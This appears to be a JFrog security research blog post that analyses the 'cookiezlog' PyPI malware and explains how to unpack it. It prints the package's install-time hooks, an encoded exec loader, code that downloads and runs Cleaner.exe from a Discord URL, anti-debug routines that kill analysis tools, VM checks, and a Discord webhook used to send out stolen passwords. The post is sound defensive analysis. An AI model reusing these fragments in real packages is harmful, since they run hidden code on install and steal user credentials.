@@ -1,0 +1,150 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214404_304397\PyPImalwarearestartingtoemployAntiDebugtechniques863x3001.png
+
+The JFrog Security Research team continuously monitors popular open-source software (OSS) repositories with our automated tooling, and reports any vulnerabilities or malicious packages discovered to repository maintainers and the wider community.
+Most PyPI malware today tries to avoid static detection using various techniques: starting from primitive variable mangling to sophisticated code flattening and steganography techniques. Use of these techniques makes the package extremely suspicious, but it does prevent novice researchers from understanding the exact operation of the malware using static analysis tools. However – any dynamic analysis tool, such as a malware sandbox, quickly removes the malware’s static protection layers and reveals the underlying logic.
+Recently, it seems that attackers have stepped up a notch – we’ve recently detected and disclosed the cookiezlog package which seemed to employ Anti-debugging code (designed to thwart dynamic analysis tools) in addition to regular obfuscation tools and techniques. This is the first time our research team (or any publication) have spotted these kinds of defenses in PyPI malware.
+In this post, we will give an overview of the techniques used in this Python malware and how to unpack similar malware.
+Installation triggers
+Similar to most malicious packages, the cookiezlog package runs immediately upon installation. This is achieved via “develop” and “install” triggers in setup.py –
+class PostDevelopCommand(develop):
+    def run(self):
+        execute()
+        install.run(self)
+ 
+ 
+class PostInstallCommand(install):
+    def run(self):
+        execute()
+        install.run(self)
+ 
+...
+ 
+setup(
+    name='cookiezlog',
+    version='0.0.1',
+    description='Extra Package for Roblox grabbing',
+    ...
+    cmdclass={
+        'develop': PostDevelopCommand,
+        'install': PostInstallCommand,
+    },
+)
+Static Obfuscation Part 1 – The trivial stuff
+The first and simplest layer of protection is zlib-encoded code, which is executed immediately after the package is installed –
+def execute():
+   import marshal,zlib;exec(marshal.loads(zlib.decompress(b'x\x9cM\x90\xc1J\xc3@\x10\x86\xeb\xb5O\xb1\xec)\x01\xd9\xdd4I\x93\x08=\x84\xe0A\xa8(\xa1\x1e<\x85\x98\x0c6hv\xd7...')))
+The decoded payload downloads a file from a hardcoded URL and executes it on the victim’s machine –
+URL = "https://cdn.discordapp.com/attachments/1037723441480089600/1039359352957587516/Cleaner.exe"
+response = requests.get(URL)
+open("Cleaner.exe", "wb").write(response.content)
+os.system("set __COMPACT_LAYER=RunAsInvoker | start Cleaner.exe")
+The executable is a Windows PE file. Looking at the strings in the executable, we can see that it’s not actual native code but rather a Python script packed into the PE format –
+$ strings Cleaner.exe | grep 'PyIns'
+Cannot open PyInstaller archive from executable (%s) or external archive (%s)
+PyInstaller: FormatMessageW failed.
+PyInstaller: pyi_win32_utils_to_utf8 failed.
+It can be quickly unpacked with the open-source tool PyInstaller Extractor.
+The extracted code contains a lot of files, primarily third-party libraries. The most interesting extracted file is main.pyc, which contains the malware code as Python bytecode.
+Static Obfuscation Part 2 – Unpacking PyArmor
+Normally, we would be able to decompile the bytecode in main.pyc to Python source code, using tools such as uncompyle6. However, in this case, another run of strings on main.pyc shows that the binary has been obfuscated with PyArmor:
+pytransformr
+__pyarmor__
+Dist\obf\main.py
+PyArmor is a commercial packer and obfuscator, which applies obfuscation techniques to the original code, encrypts it and protects it from analysis. Fortunately for the researchers, PyArmor keeps much of the information that’s necessary for introspection. Knowing this, we can try to restore the names of the functions and constants used in the original code.
+Although PyArmor does not have any publicly-available unpacker, it can be fully unpacked with some manual effort. In this case, we chose to perform a quick unpacking shortcut (by using library injection) since we were mostly interested in the original symbols and strings.
+Trying to run the packed module as a standalone script produces an error, specifying that the system doesn’t have the required module –
+$ python.exe .\main.pyc
+Traceback (most recent call last):
+  File "<dist\obf\main.py>", line 3, in 
+  File "", line 1, in 
+ModuleNotFoundError: No module named 'psutil'
+Because the module looks for the psutil module, we can create a module with the same name somewhere in the PYTHONPATH and it will be executed in the context of the process. This can be used as an easy entry point for injecting our own code into the process. We created our own file named psutil.py in the same directory as the protected file (main.pyc) with the following code –
+import inspect
+for frame in inspect.stack():
+   for c in frame.frame.f_code.co_consts:
+       if not inspect.iscode(c):
+           continue
+       dis.show_code(c)
+The snippet uses the inspect module, which allows to get a runtime information about the code being executed: it iterates over execution frames and extracts the names of the code blocks and referenced constants.
+After running our snippet, it returned a list of strings that allowed us to discern the capabilities and origin of the malicious code. The most interesting strings were the URL of an injection module, pointing to the possible attacker’s repository, and references to anti-VM functionalities in the code:
+Injector
+app-(\d*\.\d*)*) https://raw.githubusercontent.com/Syntheticc/injection1/main/injection.js
+%WEBHOOK%
+%IP%
+index.js
+check_vm None
+VMwareService.exe
+VMwareTray.exe
+Anti-Debug Techniques
+The Syntheticc GitHub profile mentioned in the strings was still available at the time of writing. The profile’s repositories contain a bunch of open-source hacking tools. Among others there was a repository called “Advanced Anti Debug”, containing methods that could be used to prevent analysis of the malware –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214404_304397\1_SyntheticcGitHubprofile.png
+
+We can split the dynamic methods the malware used into two categories: Anti-Debug and Anti-VM.
+The Anti-Debug checks look for suspicious system activity related to any debuggers or disassemblers and includes the following functions:
+check_processes looks whether debugger process runs on the system – comparing the active process list to the list of over 50 known tools, including –
+
+“idau64.exe” (IDA Pro Disassembler)
+“x64dbg.exe” (x64dbg Debugger)
+“Windbg.exe” (WinDbg Debugger)
+“Devenv.exe” (Visual Studio IDE)
+“Processhacker.exe” (Process Hacker)
+PROCNAMES = [
+    "ProcessHacker.exe",
+    "httpdebuggerui.exe",
+    "wireshark.exe",
+    "fiddler.exe",
+    "regedit.exe",
+...
+]
+ 
+for proc in psutil.process_iter():
+    if proc.name() in PROCNAMES:
+        proc.kill()
+check_research_tools has almost the same functionality, comparing substrings of process names to a humble list of five traffic analysis tools –
+
+“wireshark” (Wireshark network protocol analyzer)
+“fiddler” (Fiddler proxy)
+“http” (HTTP Debugger and possibly more tools)
+“traffic” (generic term)
+“packet” (generic term)
+If any of these processes are found to be running, the Anti-Debug code tries to kill the process  via psutil.Process.kill – not a very subtle approach. Malware that is more stealth-conscious would just stop running without any indication, instead of interacting with external processes.
+The other anti-debug techniques try to make sure the malware is not running inside a virtual machine –
+check_dll checks the system root directories for DLLs indicating that the system is running under a VMWare (“vmGuestLib.dll”) or VirtualBox (“vboxmrxnp.dll”) virtual machine guest.
+check_vm checks if any VMware-related processes are running, specifically VMwareService.exe or VMwareTray.exe.
+check_registry looks for keys used by virtual machines, for example a well-known registry key that gets added when VMWare drivers are installed – HKEY_LOCAL_MACHINE\SYSTEM\
+ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\DriverDesc
+def check_registry():
+    if system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul") != 1 and system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul") != 1:exit_program('Detected Vm')
+    handle = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
+    try:
+        if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]: exit_program('Detected Vm')
+    finally: CloseKey(handle)
+Last but not least, the check_specs function analyzes the current machine usage –
+def check_specs():
+    if int(str(virtual_memory()[0]/1024/1024/1024).split(".")[0]) <= 4: exit_program('Memory Ammount Invalid')
+    if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: exit_program('Storage Ammount Invalid')
+    if int(cpu_count()) <= 1: exit_program('Cpu Counts Invalid')
+If there is a small amount of memory, disk space or only one CPU, it assumes that the process is running inside a virtual machine.
+All of the checks mentioned above are relatively simple, but with the respectable protection against static analysis the malware already employed, it offers adequate protection against novice researchers – especially ones who only use automated analysis tools which wouldn’t be able to breach the defenses of this specific malware.
+The Payload – Simple Password Grabber
+The payload is disappointingly simple compared to the amount of defenses used by the malware, but it is still harmful. The payload is a password grabber, which gathers “autocomplete” passwords saved in the data caches of popular browsers and sends them to the C2 server (in this case a Discord hook – https[://]discord[.]com/api/webhooks/1039353898445582376/cvrsu8CslmIYzNyXMpkjbkNEy_O0yjg08x5R_a7mPdgooQquALPINn1YfD5CuJ11dM7h).
+From the strings extracted from the malware we can deduce that in addition to the “industry standard” Discord token leaker functionality, the payload also hunts for passwords of several financial services as can be seen by strings used by the send_info function –
+Name: send_info
+Filename: 
+Argument count: 0
+...
+Constants:
+0: None
+1: 'USERPROFILE'
+...
+5: 'coinbase'
+...
+7: 'binance'
+...
+9: 'paypal'
+...
+Summary
+We can once again see that malware developers constantly evolve their arsenal, adding new methods of evasion, and new layers of protection against analysis of their tools. Just a couple of years ago, the only tools that PyPI malware authors used were simple payload encoders. Today we see that malware that’s uploaded to OSS repositories is becoming more complex, has a few levels of static and dynamic protection and utilize combinations of commercial and homebrew tools. This is similar to their “colleagues” in the world of native malware and as such we are expecting OSS-repo malware to continue to evolve, perhaps with advanced techniques such as custom polymorphic encoding and deeper anti-debug methods.
+Stay up-to-date with JFrog Security Research
+Follow the latest discoveries and technical updates from the JFrog Security Research team in our security research blog posts and on Twitter at @JFrogSecurity.
